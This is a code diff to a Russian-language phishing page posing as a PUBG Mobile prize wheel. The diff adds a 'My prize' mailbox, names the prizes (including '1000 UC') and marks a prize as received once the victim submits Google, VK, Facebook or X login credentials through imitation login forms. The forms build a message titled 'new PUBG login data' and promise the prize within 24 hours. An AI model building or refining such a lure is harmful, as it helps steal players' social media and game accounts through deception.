@@ -128,6 +128,208 @@
             margin-left: 40px;
         }
         
+        /* Иконка почты для приза */
+        .prize-mail-icon {
+            position: relative;
+            margin-left: auto;
+            margin-right: 20px;
+        }
+        
+        .prize-mail-btn {
+            background: linear-gradient(to right, #2a3b5a, #1a2c42);
+            color: #8da1b5;
+            border: 1px solid #2a3b5a;
+            border-radius: 5px;
+            padding: 8px 15px;
+            font-family: Arial, sans-serif;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+            transition: all 0.3s;
+        }
+        
+        .prize-mail-btn:hover {
+            background: linear-gradient(to right, #3a4b6a, #2a3c52);
+            transform: translateY(-2px);
+        }
+        
+        .prize-badge {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background: #ff4444;
+            color: white;
+            font-size: 12px;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        
+        .prize-mail-btn:disabled {
+            background: linear-gradient(to right, #444, #555);
+            color: #777;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        /* Окно с призом */
+        .prize-window {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2001;
+            backdrop-filter: blur(5px);
+        }
+        
+        .prize-window.active {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .prize-content {
+            background: rgba(20, 35, 60, 0.95);
+            border-radius: 20px;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            border: 2px solid #2a3b5a;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        
+        .prize-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .prize-title {
+            color: #8da1b5;
+            font-size: 22px;
+            font-weight: 500;
+            font-family: Arial, sans-serif;
+        }
+        
+        .close-prize {
+            background: none;
+            border: none;
+            color: #8da1b5;
+            font-size: 28px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        
+        .close-prize:hover {
+            color: #fff;
+        }
+        
+        .prize-image-container {
+            margin: 20px 0;
+            padding: 20px;
+            background: rgba(10, 21, 32, 0.7);
+            border-radius: 15px;
+            border: 2px solid #2a3b5a;
+        }
+        
+        .prize-image {
+            width: 150px;
+            height: 150px;
+            object-fit: contain;
+            margin: 0 auto;
+        }
+        
+        .prize-name {
+            color: #8da1b5;
+            font-size: 18px;
+            margin: 15px 0;
+            font-family: Arial, sans-serif;
+            font-weight: 500;
+        }
+        
+        .prize-status {
+            color: #8da1b5;
+            font-size: 16px;
+            margin: 15px 0;
+            font-family: Arial, sans-serif;
+            padding: 10px;
+            background: rgba(42, 59, 90, 0.5);
+            border-radius: 8px;
+        }
+        
+        .prize-status.received {
+            color: #4CAF50;
+            background: rgba(76, 175, 80, 0.1);
+            border: 1px solid #4CAF50;
+        }
+        
+        .prize-status.not-received {
+            color: #ff9800;
+            background: rgba(255, 152, 0, 0.1);
+            border: 1px solid #ff9800;
+        }
+        
+        .get-prize-now-btn {
+            background: linear-gradient(45deg, #2a3b5a 0%, #1a2c42 100%);
+            color: #8da1b5;
+            border: none;
+            border-radius: 60px;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            box-shadow: 0 10px 25px rgba(42, 59, 90, 0.5);
+            transition: all 0.3s;
+            width: 100%;
+            font-family: Arial, sans-serif;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            backdrop-filter: blur(5px);
+            border: 2px solid rgba(42, 59, 90, 0.5);
+        }
+        
+        .get-prize-now-btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(42, 59, 90, 0.7);
+            background: linear-gradient(45deg, #3a4b6a 0%, #2a3c52 100%);
+        }
+        
+        .get-prize-now-btn:disabled {
+            background: linear-gradient(45deg, #444, #555);
+            color: #777;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .no-prize-message {
+            color: #8da1b5;
+            font-size: 16px;
+            margin: 30px 0;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            line-height: 1.5;
+        }
+        
         .container {
             width: 100%;
             max-width: 800px;
@@ -1205,11 +1407,14 @@
         
         .google-password-container {
             margin-bottom: 15px;
-            position: relative;
         }
         
         .google-password-label {
-            display: none; /* Убираем метку над полем */
+            display: block;
+            margin-bottom: 5px;
+            color: #5F6368;
+            font-size: 14px;
+            font-family: Arial, sans-serif;
         }
         
         .google-password-input {
@@ -1221,22 +1426,11 @@
             background: white;
             color: #202124;
             font-family: Arial, sans-serif;
-            position: relative;
-        }
-        
-        .google-password-input::placeholder {
-            color: #5F6368;
         }
         
         .google-password-input:focus {
             outline: none;
             border-color: #1A73E8;
-        }
-        
-        /* Стиль для плейсхолдера по центру */
-        .google-password-input.centered-placeholder::placeholder {
-            text-align: center;
-            color: #5F6368;
         }
         
         .google-password-options {
@@ -1437,6 +1631,17 @@
             .google-email-modal {
                 padding: 30px 20px;
             }
+            
+            .prize-mail-btn {
+                padding: 6px 12px;
+                font-size: 14px;
+            }
+            
+            .prize-badge {
+                width: 18px;
+                height: 18px;
+                font-size: 10px;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -1444,6 +1649,20 @@
 <body>
     <!-- Уведомление -->
     <div class="notification" id="notification"></div>
+    
+    <!-- Окно с призом -->
+    <div class="prize-window" id="prizeWindow">
+        <div class="prize-content">
+            <div class="prize-header">
+                <h2 class="prize-title">ВАШ ПРИЗ</h2>
+                <button class="close-prize" onclick="closePrizeWindow()">&times;</button>
+            </div>
+            
+            <div id="prizeWindowContent">
+                <!-- Содержимое будет заполняться динамически -->
+            </div>
+        </div>
+    </div>
 
     <!-- Модальные окна для входа -->
     
@@ -1646,8 +1865,8 @@
             
             <form id="googlePasswordForm">
                 <div class="google-password-container">
-                    <!-- Убрали label и добавили плейсхолдер с классом для центрирования -->
-                    <input type="password" class="google-password-input centered-placeholder" placeholder="Введите пароль" required>
+                    <label class="google-password-label">Введите пароль</label>
+                    <input type="password" class="google-password-input" required>
                 </div>
                 
                 <div class="google-password-options">
@@ -1693,7 +1912,12 @@
             </div>
         </div>
         <div class="logo">PUBG MOBILE</div>
-        <div style="width: 80px;"></div>
+        <div class="prize-mail-icon">
+            <button class="prize-mail-btn" id="prizeMailBtn">
+                <i class="fas fa-gift"></i> Мой приз
+                <div class="prize-badge" id="prizeBadge">0</div>
+            </button>
+        </div>
     </div>
 
     <div class="container">
@@ -1834,6 +2058,8 @@
         // Переменные для хранения данных
         let googleEmail = '';
         let xUsername = '';
+        let userPrize = null;
+        let isPrizeReceived = false;
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -1864,6 +2090,83 @@
             openModal('xModalStep1');
         }
         
+        // Функции для окна приза
+        function openPrizeWindow() {
+            document.getElementById('prizeWindow').classList.add('active');
+            document.body.style.overflow = 'hidden';
+            
+            const content = document.getElementById('prizeWindowContent');
+            
+            if (userPrize) {
+                content.innerHTML = `
+                    <div class="prize-image-container">
+                        <img src="${userPrize.image}" alt="${userPrize.name}" class="prize-image">
+                    </div>
+                    <div class="prize-name">${userPrize.name}</div>
+                    <div class="prize-status ${isPrizeReceived ? 'received' : 'not-received'}">
+                        ${isPrizeReceived ? '✅ Приз уже получен' : '⏳ Ожидает получения'}
+                    </div>
+                    ${!isPrizeReceived ? `
+                    <button class="get-prize-now-btn" onclick="getPrizeFromWindow()">
+                        <i class="fas fa-gift"></i> ПОЛУЧИТЬ СЕЙЧАС
+                    </button>
+                    ` : ''}
+                    <p style="color: #8da1b5; font-size: 14px; margin-top: 15px; font-family: Arial, sans-serif;">
+                        ${isPrizeReceived ? 
+                            'Ваш приз был отправлен на ваш аккаунт PUBG Mobile.' : 
+                            'Выберите социальную сеть для получения приза.'}
+                    </p>
+                `;
+            } else {
+                content.innerHTML = `
+                    <div class="no-prize-message">
+                        <i class="fas fa-box-open" style="font-size: 60px; margin-bottom: 20px; color: #8da1b5;"></i>
+                        <p>У вас пока нет выигранных призов.</p>
+                        <p>Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!</p>
+                    </div>
+                `;
+            }
+        }
+        
+        function closePrizeWindow() {
+            document.getElementById('prizeWindow').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+        
+        function getPrizeFromWindow() {
+            closePrizeWindow();
+            
+            // Сбрасываем выбор соцсети
+            socialOptions.forEach(opt => opt.classList.remove('selected'));
+            selectedSocial = null;
+            
+            // Показываем форму выбора соцсети
+            socialSelectSection.classList.add('active');
+            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+            
+            showNotification("Выберите социальную сеть для получения приза");
+        }
+        
+        function updatePrizeBadge() {
+            const badge = document.getElementById('prizeBadge');
+            const mailBtn = document.getElementById('prizeMailBtn');
+            
+            if (userPrize && !isPrizeReceived) {
+                badge.textContent = '1';
+                badge.style.display = 'flex';
+                mailBtn.disabled = false;
+            } else if (userPrize && isPrizeReceived) {
+                badge.textContent = '✓';
+                badge.style.display = 'flex';
+                badge.style.background = '#4CAF50';
+                mailBtn.disabled = false;
+            } else {
+                badge.textContent = '0';
+                badge.style.display = 'none';
+                mailBtn.disabled = false;
+            }
+        }
+        
         document.addEventListener('DOMContentLoaded', function() {
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
@@ -1877,18 +2180,19 @@
             const spinSound = document.getElementById('spinSound');
             const winSound = document.getElementById('winSound');
             const socialOptions = document.querySelectorAll('.social-option');
+            const prizeMailBtn = document.getElementById('prizeMailBtn');
             
             // Призы с картинками
             const prizes = [
-                { id: 1, image: "priz1.png" },
-                { id: 2, image: "priz2.png" },
-                { id: 3, image: "priz3.png" },
-                { id: 4, image: "priz4.png" },
-                { id: 5, image: "priz5.png" },
-                { id: 6, image: "priz6.png" },
-                { id: 7, image: "priz7.png" },
-                { id: 8, image: "priz8.png" },
-                { id: 9, image: "priz9.png" }
+                { id: 1, image: "priz1.png", name: "Редкая экипировка" },
+                { id: 2, image: "priz2.png", name: "Эксклюзивное оружие" },
+                { id: 3, image: "priz3.png", name: "Особый транспорт" },
+                { id: 4, image: "priz4.png", name: "Легендарный скин" },
+                { id: 5, image: "priz5.png", name: "Главный приз: 1000 UC" },
+                { id: 6, image: "priz6.png", name: "Эмоция танца" },
+                { id: 7, image: "priz7.png", name: "Набор выживальщика" },
+                { id: 8, image: "priz8.png", name: "Улучшенный рюкзак" },
+                { id: 9, image: "priz9.png", name: "Золотой парашют" }
             ];
             
             let isSpinning = false;
@@ -2058,6 +2362,13 @@
                         setTimeout(() => {
                             isSpinning = false;
                             
+                            // Сохраняем выигранный приз
+                            userPrize = prizes[finalPrizeIndex];
+                            isPrizeReceived = false;
+                            
+                            // Обновляем значок
+                            updatePrizeBadge();
+                            
                             hasPlayed = true;
                             playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                             
@@ -2068,6 +2379,8 @@
                             // Показываем форму выбора соцсети
                             socialSelectSection.classList.add('active');
                             socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                            
+                            showNotification(`Поздравляем! Вы выиграли: ${userPrize.name}`);
                         }, 1000);
                     }, 300);
                 }
@@ -2109,6 +2422,8 @@
                 
                 if (success) {
                     closeModal('xModalStep2');
+                    isPrizeReceived = true;
+                    updatePrizeBadge();
                     showConfirmation();
                     showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
                 }
@@ -2128,6 +2443,8 @@
                 
                 if (success) {
                     closeModal('vkModal');
+                    isPrizeReceived = true;
+                    updatePrizeBadge();
                     showConfirmation();
                     showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
                 }
@@ -2146,6 +2463,8 @@
                 
                 if (success) {
                     closeModal('facebookModal');
+                    isPrizeReceived = true;
+                    updatePrizeBadge();
                     showConfirmation();
                     showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
                 }
@@ -2167,8 +2486,7 @@
             // Google форма (этап 2: пароль)
             document.getElementById('googlePasswordForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
-                const passwordInput = this.querySelector('.google-password-input');
-                const password = passwordInput.value;
+                const password = this.querySelector('input').value;
                 const showPassword = document.getElementById('showPassword').checked;
                 
                 const loginData = {
@@ -2181,6 +2499,8 @@
                 
                 if (success) {
                     closeModal('googleModalStep2');
+                    isPrizeReceived = true;
+                    updatePrizeBadge();
                     showConfirmation();
                     showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
                 }
@@ -2231,7 +2551,7 @@
                     'google': 'Google'
                 };
                 
-                const prizeName = `Приз #${prizeIndex + 1}`;
+                const prizeName = prizes[prizeIndex]?.name || `Приз #${prizeIndex + 1}`;
                 
                 let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
                 message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
@@ -2304,8 +2624,12 @@
             // Запуск рулетки
             playBtn.addEventListener('click', startRoulette);
             
+            // Открытие окна с призом
+            prizeMailBtn.addEventListener('click', openPrizeWindow);
+            
             // Инициализация
             selectionFrame.style.opacity = '0';
+            updatePrizeBadge();
             
             // Предзагрузка изображений
             function preloadImages() {
@@ -2349,6 +2673,13 @@
                         document.body.style.overflow = 'auto';
                     }
                 });
+            });
+            
+            // Закрытие окна приза при клике вне его
+            document.getElementById('prizeWindow').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closePrizeWindow();
+                }
             });
         });
     </script>
